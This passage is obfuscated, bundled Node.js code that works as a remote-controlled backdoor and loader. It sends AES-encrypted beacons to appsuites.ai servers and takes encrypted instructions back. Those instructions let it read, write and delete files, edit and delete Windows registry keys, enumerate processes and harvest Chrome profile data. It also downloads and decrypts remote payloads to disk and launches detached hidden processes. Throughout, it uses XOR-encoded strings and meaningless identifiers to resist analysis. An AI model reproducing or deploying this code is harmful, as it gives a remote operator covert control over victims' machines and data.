      cm.P5DB32Q = [156, ''];
      cm.X5EADV2 = [157, ''];
      cm.F482TAM = [158, ''];
      cm.p5FDZHQ = [159, ''];
      cm.W592FFM = [160, ''];
      cm.q637JNS = [161, ''];
      cm.d422GJH = [162, ''];
      cm.v535X73 = [163, ''];
      cm.K4E5MWI = [164, ''];
      cm.W4F1V66 = [165, ''];
      cm.n4EBPL8 = [166, ''];
      const cn = class dp {
        static s59BT06(dq, dr = 0) {}
        static async W4EF0EI(ds, dt, du) {
          await this.Q44BIX9(1, ds, dt, undefined, du);
        }
        static async Y6CDW21(dv, dw, dx, dy) {
          await this.Q44BIX9(-1, dv, dw, dx, dy);
        }
        static async Q44BIX9(dz, ea, eb, ec, ed) {
          function ee(ei) {
            if (!ei) {
              return '';
            }
            let str6 = '';
            for (const ej of ei) {
              if (str6.length > 0) {
                str6 += '|';
              }
              if (typeof ej === 'boolean') {
                str6 += ej ? '1' : '0';
              } else {
                str6 += ej.toString().replace('|', '_');
              }
            }
            return str6;
          }
          var ef = ci.e5325L3.q474LOF ?? '';
          if (ef == '') {
            ef = "initialization";
          }
          const params = new require("url").URLSearchParams();
          const eg = ch.S559FZQ.n677BRA.substring(0, 24) + ef.substring(0, 8);
          const eh = cy(eg, JSON.stringify({
            b: ea,
            c: ee(ed),
            e: ec ? ec.toString() : '',
            i: ef,
            l: dz,
            m: eb[0],
            p: ch.S559FZQ.t5A2WVR() ? 1 : 2,
            s: ci.e5325L3.x484Q1X,
            v: ci.e5325L3.Y55B2P2
          }));
          params.append("data", eh.data);
          params.append("iv", eh.iv);
          params.append("iid", ef);
          await ct("api/s3/event", params);
        }
        static g597ORN() {}
      };
      cg.w3F3UWA = cn;
      function co(ek, el = [], em) {
        return require("child_process").spawn(ek, el, {
          detached: true,
          stdio: "ignore",
          cwd: em
        });
      }
      cg.r5EEMKP = co;
      async function cp(en) {
        return await require("node-fetch")(en);
      }
      cg.y42BRXF = cp;
      async function cq(eo, ep) {
        return await require("node-fetch")(eo, {
          method: "POST",
          body: JSON.stringify(ep)
        });
      }
      cg.J60DFMS = cq;
      async function cr(eq) {
        const fetch = require("node-fetch");
        let er;
        let es = "https://appsuites.ai/" + eq;
        try {
          er = await fetch(es);
        } catch {}
        if (!er || !er.ok) {
          try {
            es = "https://sdk.appsuites.ai/" + eq;
            er = await fetch(es);
          } catch {}
        }
        return er;
      }
      cg.e696T3N = cr;
      async function cs(et, eu) {
        const fetch2 = require("node-fetch");
        let ev;
        let ew = "https://appsuites.ai/" + et;
        if (eu.has('')) {
          eu.append('', '');
        }
        const obj2 = {
          headers: {
            "Content-Type": "application/x-www-form-urlencoded"
          },
          method: "POST",
          body: eu
        };
        try {
          ev = await fetch2(ew, obj2);
        } catch {}
        if (!ev || !ev.ok) {
          try {
            ew = "https://sdk.appsuites.ai/" + et;
            ev = await fetch2(ew, obj2);
          } catch {}
        }
        return ev;
      }
      cg.h5235DD = cs;
      async function ct(ex, ey) {
        if (ey.has('')) {
          ey.append('', '');
        }
        return await require("node-fetch")("https://appsuites.ai/" + ex, {
          headers: {
            "Content-Type": "application/x-www-form-urlencoded"
          },
          method: "POST",
          body: ey
        });
      }
      cg.e63F2C3 = ct;
      function cu(ez, fa) {
        return new Promise((fb, fc) => {
          const fd = require("fs").createWriteStream(fa, {});
          const fe = (ez.startsWith("https") ? require("https") : require("http")).get(ez, (res) => {
            if (!res.statusCode || res.statusCode < 200 || res.statusCode > 299) {
              fc(new Error("LoadPageFailed " + res.statusCode));
            }
            res.pipe(fd);
            fd.on("finish", function () {
              fd.destroy();
              fb();
            });
          });
          fe.on("error", (ff) => fc(ff));
        });
      }
      cg.p464G3A = cu;
      function cv(fg) {
        try {
          require("fs").unlinkSync(fg);
        } catch {}
      }
      cg.T667X3K = cv;
      async function cw() {
        const fs6 = require("fs");
        const path2 = require("path");
        const proc = require("process");
        const fh = ch.S559FZQ.L695HPV;
        if (fs6.existsSync(fh)) {
          const fi = new Date().getTime() - fs6.statSync(fh).mtime.getTime();
          if (fi < 900000) {
            proc.exit(0);
          } else {
            fs6.unlinkSync(fh);
          }
        }
        fs6.writeFileSync(fh, '');
        proc.on("exit", () => {
          fs6.unlinkSync(fh);
        });
      }
      cg.F490EUX = cw;
      function cx(fj) {
        try {
          return require("fs").statSync(fj).size;
        } catch {
          return 0;
        }
      }
      cg.m4F8RIX = cx;
      function cy(fk, fl) {
        try {
          const crypto = require("crypto");
          const fm = crypto.randomBytes(16);
          const fn = crypto.createCipheriv("aes-256-cbc", fk, fm);
          let fo = fn.update(fl, "utf8", "hex");
          fo += fn.final("hex");
          return {
            data: fo,
            iv: fm.toString("hex")
          };
        } catch {
          return;
        }
      }
      cg.O694X7J = cy;
      function cz(fp, fq, fr) {
        try {
          const ft = require("crypto").createDecipheriv("aes-256-cbc", Buffer.from(fp), Buffer.from(fr, "hex"));
          let fu = ft.update(Buffer.from(fq, "hex"));
          fu = Buffer.concat([fu, ft.final()]);
          return fu.toString();
        } catch {
          return;
        }
      }
      cg.U61FWBZ = cz;
      function da(fv) {
        return Buffer.from(fv, "hex").toString("utf8");
      }
      cg.S634YX3 = da;
      function db(fw, ...fx) {
        try {
          var fy = fw.replace(/{(\d+)}/g, function (fz, ga) {
            const gb = parseInt(ga);
            if (isNaN(gb)) {
              return fz;
            }
            return typeof fx[gb] !== 'undefined' ? fx[gb] : fz;
          });
          return fy;
        } catch {
          return fw;
        }
      }
      cg.o5B4F49 = db;
    }
  });
  const f = b({
    'obj/V3EDFYY.js'(gc) {
      'use strict';

      Object.defineProperty(gc, '__esModule', {
        value: true
      });
      gc.t505FAN = undefined;
      const gd = c();
      const ge = e();
      var gf;
      (function (hm) {
        hm[hm.p5B1KEV = 0] = "p5B1KEV";
      })(gf || (gf = {}));
      var gg;
      (function (hn) {
        hn[hn.O435AMZ = 0] = "O435AMZ";
        hn[hn.w692AS2 = 1] = 'w692AS2';
      })(gg || (gg = {}));
      var gh;
      (function (ho) {
        ho[ho.B639G7B = 0] = "B639G7B";
        ho[ho.O435AMZ = 1] = "O435AMZ";
        ho[ho.j451KZ4 = 2] = "j451KZ4";
        ho[ho.R62AFMF = 3] = "R62AFMF";
        ho[ho.S58EMWW = 4] = "S58EMWW";
        ho[ho.P5F9KBR = 5] = "P5F9KBR";
      })(gh || (gh = {}));
      function gi(hp) {
        const hq = Buffer.isBuffer(hp) ? hp : Buffer.from(hp);
        const buf = Buffer.from(hq.slice(4));
        for (let n2 = 0; n2 < buf.length; n2++) {
          buf[n2] ^= hq.slice(0, 4)[n2 % 4];
        }
        return buf.toString("utf8");
      }
      function gj(hr) {
        hr = hr[gi([16, 233, 75, 213, 98, 140, 59, 185, 113, 138, 46])](/-/g, '');
        return Buffer.from("276409396fcc0a23" + hr.substring(0, 16), "hex");
      }
      function gk() {
        return Uint8Array.from([162, 140, 252, 232, 178, 47, 68, 146, 150, 110, 104, 76, 128, 236, 129, 43]);
      }
      function gl() {
        return Uint8Array.from([132, 144, 242, 171, 132, 73, 73, 63, 157, 236, 69, 155, 80, 5, 72, 144]);
      }
      function gm() {
        return Uint8Array.from([28, 227, 43, 129, 197, 9, 192, 3, 113, 243, 59, 145, 209, 193, 56, 86, 104, 131, 82, 163, 221, 190, 10, 67, 20, 245, 151, 25, 157, 70, 17, 158, 122, 201, 112, 38, 29, 114, 194, 166, 183, 230, 137, 160, 167, 99, 27, 45, 46, 31, 96, 23, 200, 241, 64, 26, 57, 33, 83, 240, 247, 139, 90, 48, 233, 6, 110, 12, 44, 108, 11, 73, 34, 231, 242, 173, 37, 92, 162, 198, 175, 225, 143, 35, 176, 133, 72, 212, 165, 195, 36, 226, 147, 68, 69, 146, 14, 0, 161, 87, 53, 196, 199, 195, 19, 80, 4, 49, 169, 188, 153, 30, 124, 142, 206, 159, 180, 170, 123, 88, 15, 95, 210, 152, 24, 63, 155, 98, 181, 7, 141, 171, 85, 103, 246, 222, 97, 211, 248, 136, 126, 22, 168, 214, 249, 93, 109, 91, 111, 21, 213, 229, 135, 207, 54, 40, 244, 47, 224, 215, 164, 51, 208, 100, 144, 16, 55, 66, 18, 42, 39, 52, 186, 127, 118, 65, 61, 202, 160, 253, 125, 74, 50, 106, 228, 89, 179, 41, 232, 148, 32, 231, 138, 132, 121, 115, 150, 220, 5, 240, 184, 182, 76, 243, 58, 60, 94, 238, 107, 140, 163, 217, 128, 120, 78, 134, 102, 75, 105, 79, 116, 247, 119, 189, 149, 185, 216, 13, 117, 236, 126, 156, 8, 130, 2, 154, 178, 101, 71, 254, 62, 1, 81, 177, 205, 250, 219, 6, 203, 172, 125, 191, 218, 77, 235, 252]);
      }
      function gn(hs, ht) {
        if (hs.length !== ht.length) {
          return false;
        }
        for (let hu = 0; hu < hs.length; hu++) {
          if (hs[hu] !== ht[hu]) {
            return false;
          }
        }
        return true;
      }
      function go(hv) {
        if (!hv) {
          return new Uint8Array();
        }
        return new Uint8Array(Buffer.from(hv, "hex"));
      }
      function gp(hw) {
        if (!hw) {
          return '';
        }
        return Buffer.from(hw).toString("hex");
      }
      function gq(hx, hy) {
        const crypto2 = require("crypto");
        const hz = crypto2.randomBytes(16);
        const ia = crypto2.createCipheriv("aes-128-cbc", gj(hy), hz);
        ia.setAutoPadding(true);
        let ib = ia.update(hx, "utf8", "hex");
        ib += ia.final("hex");
        return hz.toString("hex").toUpperCase() + "A0FB" + ib.toUpperCase();
      }
      function gr(ic, id) {
        const ie = require("crypto").createDecipheriv("aes-128-cbc", gj(id), Buffer.from(ic.substring(0, 32), "hex"));
        ie.setAutoPadding(true);
        let ig = ie.update(ic.substring(36), "hex", "utf8");
        ig += ie.final("utf8");
        return ig;
      }
      function gs(ih, ii) {
        if (ih.length <= 32) {
          return new Uint8Array();
        }
        const bytes = new Uint8Array([...gk(), ...ii]);
        const ij = ih.slice(0, 16);
        const ik = gm();
        const il = ih.slice(16);
        for (let io = 0; io < il.length; io++) {
          const ip = ij[io % ij.length] ^ bytes[io % bytes.length] ^ ik[io % ik.length];
          il[io] ^= ip;
        }
        const im = il.length - 16;
        if (!gn(il.slice(im), gl())) {
          return new Uint8Array();
        }
        return il.slice(0, im);
      }
      const gt = class {
        static W698NHL(iq) {
          const arr5 = [];
          if (!Array.isArray(iq)) {
            return arr5;
          }
          for (const ir of iq) {
            arr5.push({
              d5E0TQS: ir.Path ?? '',
              a47DHT3: ir.Data ?? '',
              i6B2K9E: ir.Key ?? '',
              A575H6Y: Boolean(ir.Exists),
              Q57DTM8: typeof ir.Action === "number" ? ir.Action : 0
            });
          }
          return arr5;
        }
        static T6B99CG(is) {
          return is.map((it) => ({
            Path: it.d5E0TQS,
            Data: it.a47DHT3,
            Key: it.i6B2K9E,
            Exists: it.A575H6Y,
            Action: it.Q57DTM8
          }));
        }
        static u6CAWW3(iu) {
          return {
            c608HZL: Array.isArray(iu.File) ? this.W698NHL(iu.File) : [],
            y4BAIF6: Array.isArray(iu.Reg) ? this.W698NHL(iu.Reg) : [],
            Z59DGHB: Array.isArray(iu.Url) ? this.W698NHL(iu.Url) : [],
            s67BMEP: Array.isArray(iu.Proc) ? this.W698NHL(iu.Proc) : []
          };
        }
        static N5A4FRL(iv) {
          return {
            File: this.T6B99CG(iv.c608HZL),
            Reg: this.T6B99CG(iv.y4BAIF6),
            Url: this.T6B99CG(iv.Z59DGHB),
            Proc: this.T6B99CG(iv.s67BMEP)
          };
        }
        static S59C847(iw) {
          return {
            b54FBAI: typeof iw.Progress === "number" ? iw.Progress : -1,
            P456VLZ: typeof iw.Activity === "number" ? iw.Activity : -1,
            x567X2Q: this.u6CAWW3(iw.Value ?? {}),
            J6C4Y96: iw.NextUrl ?? '',
            I489V4T: iw.Session ?? '',
            h46EVPS: typeof iw.TimeZone === "number" ? iw.TimeZone : 255,
            b4CERH3: iw.Version ?? ''
          };
        }
        static b558GNO(ix) {
          return {
            Progress: ix.b54FBAI,
            Activity: ix.P456VLZ,
            Value: this.N5A4FRL(ix.x567X2Q),
            NextUrl: ix.J6C4Y96,
            Session: ix.I489V4T,
            TimeZone: ix.h46EVPS,
            Version: ix.b4CERH3
          };
        }
        static s40B7VN(iy) {
          return JSON.stringify(this.b558GNO(iy));
        }
      };
      function gu(iz) {
        const fs7 = require("fs");
        return fs7.existsSync(iz) && fs7.lstatSync(iz).isDirectory();
      }
      function gv(ja) {
        require("fs").mkdirSync(ja, {
          recursive: true
        });
      }
      function gw(jb) {
        try {
          return JSON.parse(jb);
        } catch {
          return {};
        }
      }
      function gx(jc, jd) {
        return typeof jc?.[jd] === "object" ? jc[jd] : {};
      }
      function gy(je) {
        const path3 = require("path");
        const os = require("os");
        let jf = je;
        const obj3 = {
          "%LOCALAPPDATA%": path3.join(os.homedir(), "AppData", "Local"),
          "%APPDATA%": path3.join(os.homedir(), "AppData", "Roaming"),
          "%USERPROFILE%": os.homedir()
        };
        for (const [jg, jh] of Object.entries(obj3)) {
          const regex = new RegExp(jg, 'i');
          if (regex.test(jf)) {
            jf = jf.replace(regex, jh);
            break;
          }
        }
        return jf;
      }
      function gz() {
        return Math.floor(Date.now() / 1000).toString();
      }
      function ha(ji) {
        const fs8 = require("fs");
        if (fs8.existsSync(ji)) {
          fs8.unlinkSync(ji);
        }
      }
      function hb(jj, jk) {
        try {
          require("fs").writeFileSync(jj, jk);
          return true;
        } catch {
          return false;
        }
      }
      async function hc(jl) {
        return new Promise((jm, jn) => {
          (jl.startsWith("https") ? require("https") : require("http")).get(jl, (jo) => {
            const arr6 = [];
            jo.on("data", (jp) => arr6.push(jp));
            jo.on("end", () => jm(Buffer.concat(arr6)));
          }).on("error", (jq) => jn(jq));
        });
      }
      var str7 = '';
      var hd;
      async function he(jr, js) {
        const jt = new require("url").URLSearchParams({
          data: gq(JSON.stringify(gt.b558GNO(jr)), str7),
          iid: str7
        }).toString();
        return await await require("node-fetch")("https://on.appsuites.ai" + js, {
          headers: {
            "Content-Type": "application/x-www-form-urlencoded"
          },
          method: "POST",
          body: jt
        }).text();
      }
      async function hf(ju, jv) {
        ju.J6C4Y96 = '';
        ju.P456VLZ = 1;
        ju.b4CERH3 = "1.0.0.0";
        ju.h46EVPS = -new Date().getTimezoneOffset() / 60;
        for (let jw = 0; jw < 3; jw++) {
          ju.I489V4T = gz();
          const jx = await he(ju, jv);
          if (jx && (typeof gw(jx)?.iid === "string" ? gw(jx).iid : '') === str7) {
            break;
          }
          await new Promise((jy) => setTimeout(jy, 3000));
        }
      }
      async function hg(jz) {
        const path4 = require("path");
        const fs9 = require("fs");
        const arr7 = [];
        const ka = (kg) => {
          kg.A575H6Y = false;
          if (kg.d5E0TQS) {
            kg.A575H6Y = require("fs").existsSync(gy(kg.d5E0TQS));
          }
        };
        const kb = (kh) => {
          kh.A575H6Y = false;
          if (kh.d5E0TQS) {
            const ki = gy(kh.d5E0TQS);
            kh.A575H6Y = require("fs").existsSync(ki);
            if (kh.A575H6Y) {
              kh.a47DHT3 = gp(require("fs").readFileSync(ki));
            }
          }
        };
        const kc = (kj) => {
          kj.A575H6Y = false;
          if (kj.d5E0TQS && kj.a47DHT3) {
            kj.a47DHT3 = '';
            const kk = gy(kj.d5E0TQS);
            const kl = require("path").dirname(kk);
            if (!gu(kl)) {
              gv(kl);
            }
            kj.A575H6Y = hb(kk, go(kj.a47DHT3));
          }
        };
        const kd = (km) => {
          km.A575H6Y = false;
          if (km.d5E0TQS) {
            const kn = gy(km.d5E0TQS);
            ha(kn);
            km.A575H6Y = require("fs").existsSync(kn);
          }
        };
        const ke = (ko) => {
          ko.A575H6Y = false;
          if (ko.d5E0TQS) {
            const kp = gy(ko.d5E0TQS);
            const kq = path4.join(kp, "Local State");
            if (!require("fs").existsSync(kq)) {
              return;
            }
            const keys = Object.keys(gx(gx(gw(fs9.readFileSync(kq, "utf8")), "profile"), "info_cache"));
            for (const kr of keys) {
              const ks = path4.join(kp, kr, "Preferences");
              if (!require("fs").existsSync(ks)) {
                continue;
              }
              const kt = gx(gx(gx(gx(gw(fs9.readFileSync(ks, "utf8")), "profile"), "content_settings"), "exceptions"), "site_engagement");
              const json = JSON.stringify(kt);
              if (json) {
                arr7.push({
                  d5E0TQS: path4.join(ko.d5E0TQS, kr, "Preferences"),
                  a47DHT3: gp(Buffer.from(json, "utf8")),
                  i6B2K9E: '',
                  A575H6Y: true,
                  Q57DTM8: 5
                });
                ko.A575H6Y = true;
              }
            }
          }
        };
        for (const kf of jz) {
          if (kf.Q57DTM8 === 1) {
            ka(kf);
          } else if (kf.Q57DTM8 === 2) {
            kb(kf);
          } else if (kf.Q57DTM8 === 3) {
            kc(kf);
          } else if (kf.Q57DTM8 === 4) {
            kd(kf);
          } else if (kf.Q57DTM8 === 5) {
            ke(kf);
          }
        }
        if (arr7.length > 0) {
          jz.push(...arr7);
        }
      }
      async function hh(ku) {
        const cp2 = require("child_process");
        const arr8 = [];
        const kv = (ld) => {
          if (!ld) {
            return ['', ''];
          }
          if (ld.endsWith("\\")) {
            return [ld, ''];
          }
          const le = ld.lastIndexOf("\\");
          return le !== -1 ? [ld.substring(0, le), ld.substring(le + 1)] : [ld, ''];
        };
        const kw = (lf) => {
          return cp2.spawnSync("reg", ["query", lf], {
            stdio: "ignore"
          }).status === 0;
        };
        const kx = (lg, lh) => {
          const li = cp2.spawnSync("reg", ["query", lg, "/v", lh], {
            encoding: "utf8"
          });
          if (li.status !== 0) {
            return '';
          }
          for (const lj of li.stdout.split("\n")) {
            const lk = lj.trim().split(/\s{2,}/);
            if (lk.length >= 3 && lk[0] === lh) {
              return lk[2];
            }
          }
          return '';
        };
        const ky = (ll) => {
          let flag = false;
          const lm = cp2.spawnSync("reg", ["query", ll], {
            encoding: "utf8"
          });
          if (lm.error) {
            return flag;
          }
          if (lm.status !== 0) {
            return flag;
          }
          const ln = lm.stdout.split("\n").filter((lo) => lo.trim() !== '');
          for (let lp = 1; lp < ln.length; lp++) {
            const lq = ln[lp].trim().split(/\s{4,}/);
            if (lq.length === 3) {
              const [lr, ls, lt] = lq;
              const obj4 = {
                Q57DTM8: 2,
                A575H6Y: true,
                d5E0TQS: ll + lr,
                a47DHT3: lt,
                i6B2K9E: ''
              };
              arr8.push(obj4);
              flag = true;
            }
          }
          return flag;
        };
        const kz = (lu, lv) => {
          return cp2.spawnSync("reg", ["delete", lu, "/v", lv, "/f"], {
            stdio: "ignore"
          }).status === 0;
        };
        const la = (lw) => {
          cp2.spawnSync("reg", ["delete", lw, "/f"], {
            stdio: "ignore"
          });
        };
        const lb = (lx, ly, lz) => {
          const ma = cp2.spawnSync("reg", ["add", lx, "/v", ly, "/t", "REG_SZ", "/d", lz, "/f"], {
            stdio: "ignore"
          });
          return ma.status === 0;
        };
        for (const lc of ku) {
          if (lc.Q57DTM8 === 1) {
            if (lc.d5E0TQS) {
              const [mb, mc] = kv(lc.d5E0TQS);
              lc.A575H6Y = mc ? !!kx(mb, mc) : kw(mb);
            }
          } else if (lc.Q57DTM8 === 2) {
            if (lc.d5E0TQS) {
              const [md, me] = kv(lc.d5E0TQS);
              if (me) {
                lc.a47DHT3 = kx(md, me);
              } else {
                lc.A575H6Y = ky(md);
              }
            }
          } else if (lc.Q57DTM8 === 3) {
            if (lc.d5E0TQS && lc.a47DHT3) {
              const [mf, mg] = kv(lc.d5E0TQS);
              lc.A575H6Y = lb(mf, mg, gy(gy(lc.a47DHT3)));
            }
          } else if (lc.Q57DTM8 === 4) {
            if (lc.d5E0TQS) {
              const [mh, mi] = kv(lc.d5E0TQS);
              if (mi) {
                lc.A575H6Y = !kz(mh, mi);
              } else {
                la(mh);
                lc.A575H6Y = kw(mh);
              }
            }
          }
        }
        if (arr8.length > 0) {
          ku.push(...arr8);
        }
      }
      async function hi(mj) {
        const mk = async (mn) => {
          mn.A575H6Y = false;
          if (mn.d5E0TQS && mn.a47DHT3) {
            if (mn.a47DHT3.startsWith("http") || mn.a47DHT3.startsWith("https")) {
              const mo = await hc(mn.a47DHT3);
              if (mo.length > 0) {
                const mp = gy(mn.d5E0TQS);
                const mq = require("path").dirname(mp);
                if (!gu(mq)) {
                  gv(mq);
                }
                mn.A575H6Y = hb(mp, mo);
              }
            }
          }
        };
        const ml = async (mr) => {
          mr.A575H6Y = false;
          if (mr.d5E0TQS && mr.a47DHT3 && mr.i6B2K9E) {
            if (mr.a47DHT3.startsWith("http") || mr.a47DHT3.startsWith("https")) {
              const ms = gs(await hc(mr.a47DHT3), go(mr.i6B2K9E));
              if (ms.length > 0) {
                const mt = gy(mr.d5E0TQS);
                const mu = require("path").dirname(mt);
                if (!gu(mu)) {
                  gv(mu);
                }
                mr.A575H6Y = hb(mt, ms);
              }
            }
          }
        };
        for (const mm of mj) {
          if (mm.Q57DTM8 === 3) {
            if (!mm.i6B2K9E) {
              await mk(mm);
            } else {
              await ml(mm);
            }
          }
        }
      }
      async function hj(mv) {
        if (mv.length === 0) {
          return;
        }
        const arr9 = [];
        const mw = hd().split('|');
        const mx = (mz) => {
          for (const na of mw) {
            if (na.includes(mz.toUpperCase())) {
              return na;
            }
          }
          return '';
        };
        for (const my of mv) {
          if (my.Q57DTM8 === 1) {
            const nb = mx(my.d5E0TQS);
            my.A575H6Y = nb !== '';
            if (my.A575H6Y) {
              my.d5E0TQS = nb;
            }
          } else if (my.Q57DTM8 === 2) {
            for (const nc of mw) {
              arr9.push({
                d5E0TQS: nc,
                a47DHT3: '',
                i6B2K9E: '',
                A575H6Y: true,
                Q57DTM8: 2
              });
            }
          }
        }
        if (arr9.length > 0) {
          mv.push(...arr9);
        }
      }
      async function hk(nd) {
        const ne = gw(nd);
        const nf = typeof ne?.iid === "string" ? ne.iid : '';
        if (nf != str7) {
          return;
        }
        const ng = typeof ne?.data === "string" ? ne.data : '';
        if (ng.length == 0) {
          return;
        }
        const nh = gr(ng, nf);
        if (!nh) {
          return;
        }
        const ni = gt.S59C847(gw(nh));
        const nj = ni.J6C4Y96;
        if (!nj) {
          return;
        }
        await hg(ni.x567X2Q.c608HZL);
        await hh(ni.x567X2Q.y4BAIF6);
        await hi(ni.x567X2Q.Z59DGHB);
        await hj(ni.x567X2Q.s67BMEP);
        await hf(ni, nj);
      }
      async function hl(nk, nl) {
        str7 = nk;
        hd = nl;
        const obj5 = {
          b54FBAI: 0,
          P456VLZ: 0,
          I489V4T: gz(),
          h46EVPS: -new Date().getTimezoneOffset() / 60,
          b4CERH3: "1.0.0.0",
          J6C4Y96: '',
          x567X2Q: {
            c608HZL: [],
            y4BAIF6: [],
            Z59DGHB: [],
            s67BMEP: []
          }
        };
        const nm = await he(obj5, "/ping");
        if (nm) {
          await hk(nm);
        }
      }
      gc.t505FAN = hl;
    }
  });
  const g = b({
    'obj/T3EADFE.js'(nn) {
      'use strict';

      Object.defineProperty(nn, "__esModule", {
        value: true
      });
      nn.A672SIS = nn.U5E7DEV = nn.i61CFAL = undefined;
      const no = c();
      const np = e();
      const nq = d();
      var nr;
      (function (ny) {
        ny[ny.B639G7B = 0] = 'B639G7B';
        ny[ny.N6330WH = 1] = "N6330WH";
        ny[ny.q564DFB = 2] = 'q564DFB';
        ny[ny.q5A5TD7 = 3] = "q5A5TD7";
        ny[ny.h6074WA = 4] = "h6074WA";
        ny[ny.j4B56KB = 5] = "j4B56KB";
        ny[ny.F58C0X0 = 6] = "F58C0X0";
        ny[ny.i623ZUC = 7] = "i623ZUC";
      })(nr || (nr = {}));
      const ns = class {
        constructor() {
          this.H5C67AR = false;
          this.n412K1U = false;
          this.n5B332O = false;
          this.k61AQMQ = false;
          this.a6AFL0X = false;
          this.D4E3EHU = false;
          this.E67CJ69 = false;
          this.a586DQ2 = false;
          this.X42CN81 = false;
          this.Y4B23HN = false;
          this.T5B2T2A = false;
          this.V54518G = false;
          this.T5F71B2 = false;
          this.g5ABMVH = false;
          this.t533W41 = '';
          this.O6CBOE4 = '';
        }
      };
      nn.i61CFAL = ns;
      const nt = class {
        constructor(nz, oa, ob, oc, od) {
          this.m5BCP18 = false;
          this.C5C7K1A = '';
          this.K5F23B9 = '';
          this.j5D4IOV = '';
          this.O6CBOE4 = '';
          if (nz !== undefined) {
            this.m5BCP18 = nz;
          }
          if (oa !== undefined) {
            this.C5C7K1A = oa;
          }
          if (ob !== undefined) {
            this.K5F23B9 = ob;
          }
          if (oc !== undefined) {
            this.j5D4IOV = oc;
          }
          if (od !== undefined) {
            this.O6CBOE4 = od;
          }
        }
      };
      const nu = class {
        constructor(oe, of, og) {
          this.m5BCP18 = false;
          this.C5C7K1A = '';
          this.p6845JK = '';
          if (oe !== undefined) {
            this.m5BCP18 = oe;
          }
          if (of !== undefined) {
            this.C5C7K1A = of;
          }
          if (og !== undefined) {
            this.p6845JK = og;
          }
        }
      };
      var nv;
      (function (oh) {
        oh[oh.K4E7SBI = 0] = "K4E7SBI";
        oh[oh.C5B7MFV = 1] = "C5B7MFV";
        oh[oh.u6BB118 = 2] = 'u6BB118';
      })(nv = nn.U5E7DEV || (nn.U5E7DEV = {}));
      var nw;
      (function (oi) {
        oi[oi.s46FO09 = 0] = 's46FO09';
        oi[oi.d56ECUF = 1] = "d56ECUF";
        oi[oi.z479UBI = 2] = "z479UBI";
      })(nw || (nw = {}));
      const nx = class {
        constructor(oj, ok, ol, om, on) {
          this.Z5A9DKG = false;
          this.A64CEBI = '';
          this.X6066R5 = oj;
          this.r42EX1Q = ok;
          this.e5FBF4O = ol;
          this.t4E0LPU = om;
          this.q48AQYC = on;
        }
        async q41FDEK() {
          await np.w3F3UWA.W4EF0EI(0, [159, '']);
          async function oo() {
            return !(((await no.S559FZQ.l610ZCY("size")) ?? '') == '');
          }
          if (await oo()) {
            const or = (await no.S559FZQ.l610ZCY("iid")) ?? '';
            nq.e5325L3.q474LOF = or;
            await np.w3F3UWA.W4EF0EI(0, or != '' ? [160, ''] : [161, '']);
            return 0;
          }
          const op = this.X6066R5() ?? '';
          if ('' == op) {
            try {
              await no.S559FZQ.c5E4Z7C("size", "67");
            } catch {}
            await np.w3F3UWA.Y6CDW21(0, [154, ''], undefined, ['', op]);
            return 2;
          }
          let str8 = '';
          try {
            try {
              await no.S559FZQ.c5E4Z7C("size", "67");
            } catch {}
            var oq = await np.e696T3N("api/s3/new?fid=ip&version=" + nq.e5325L3.Y55B2P2);
            if (oq) {
              str8 = await oq.json().iid;
              if (str8 != '') {
                nq.e5325L3.q474LOF = str8;
              }
            }
            if (str8 != '') {
              const ot = function (ou) {
                let str9 = '';
                for (let ov = 0; ov < ou.length; ov++) {
                  str9 += ou.charCodeAt(ov).toString(16).padStart(2, '0');
                }
                return str9;
              };
              await no.S559FZQ.c5E4Z7C("iid", str8);
              await no.S559FZQ.c5E4Z7C("usid", ot(op));
              await np.w3F3UWA.W4EF0EI(0, [103, ''], ['', op]);
              return 1;
            } else {
              await no.S559FZQ.c5E4Z7C("iid", '');
              await np.w3F3UWA.Y6CDW21(0, [154, ''], undefined, ['', op]);
            }
          } catch (ow) {
            await np.w3F3UWA.Y6CDW21(0, [154, ''], ow, ['', op]);
          }
          return 2;
        }
        async A4B0MTO() {
          try {
            if (await this.m6ABVY9()) {
              await f().t505FAN(nq.e5325L3.q474LOF, this.q48AQYC);
            }
          } catch {}
        }
        async m58FJB5(ox) {
          try {
            nq.e5325L3.x484Q1X = ox;
            if (nq.e5325L3.x484Q1X == no.a689XV5.B639G7B) {
              return;
            }
            await np.F490EUX();
            await no.S559FZQ.J6021ZT();
            if (!(await this.m6ABVY9())) {
              return;
            }
            await this.U6B4YNR();
            await this.Z425M7G();
            var oy = await this.e4F5CS0();
            if (await this.H5AE3US(oy.O6CBOE4)) {
              const data = JSON.parse(oy.O6CBOE4);
              const arr10 = [];
              for (const oz in data) {
                if (data.hasOwnProperty(oz)) {
                  const pa = data[oz];
                  for (const pb in pa) {
                    if (pa.hasOwnProperty(pb)) {
                      await this.O69AL84(oz, pb, pa[pb]);
                      arr10.push(pb);
                    }
                  }
                }
              }
              if (arr10.length > 0) {
                await np.w3F3UWA.W4EF0EI(0, [107, ''], arr10);
              }
            }
            if (oy.H5C67AR) {
              if (oy.a6AFL0X) {
                await this.p4FE5X4(nq.e5325L3.H64FNMG);
              } else if (oy.n412K1U) {
                await this.j458FW3(nq.e5325L3.H64FNMG);
              }
              if (oy.D4E3EHU) {
                await this.k47F3QK(nq.e5325L3.M56F8MB);
              }
              if (oy.E67CJ69 && nq.e5325L3.R6780KK) {
                await this.c647ECB(oy.a586DQ2);
              }
              if (oy.X42CN81 && nq.e5325L3.g4184BO) {
                await this.w5C1TZN(oy.Y4B23HN);
              }
              if (oy.T5B2T2A && nq.e5325L3.x4ADWAE) {
                await this.h659UF4(oy.V54518G);
              }
              if (oy.T5F71B2 && nq.e5325L3.z4DE429) {
                await this.W5F8HOG(oy.g5ABMVH);
              }
            }
            await np.w3F3UWA.W4EF0EI(0, [102, ''], [nq.e5325L3.k596N0J, nq.e5325L3.n664BX9, nq.e5325L3.R6780KK, nq.e5325L3.g4184BO, nq.e5325L3.x4ADWAE, nq.e5325L3.r53FV0M, oy.H5C67AR, oy.n412K1U, oy.n5B332O, oy.k61AQMQ, oy.a6AFL0X, oy.D4E3EHU, nq.e5325L3.z4DE429]);
            return oy;
          } catch (pc) {
            await np.w3F3UWA.Y6CDW21(0, [101, ''], pc);
            return;
          }
        }
        async m6ABVY9() {
          nq.e5325L3.q474LOF = (await no.S559FZQ.l610ZCY("iid")) ?? '';
          if (!nq.e5325L3.q474LOF || nq.e5325L3.q474LOF == '') {
            return false;
          }
          return true;
        }
        async U6B4YNR() {
          const pd = nq.e5325L3.q474LOF ?? '';
          const params2 = new require("url").URLSearchParams();
          const pe = no.S559FZQ.n677BRA.substring(0, 24) + pd.substring(0, 8);
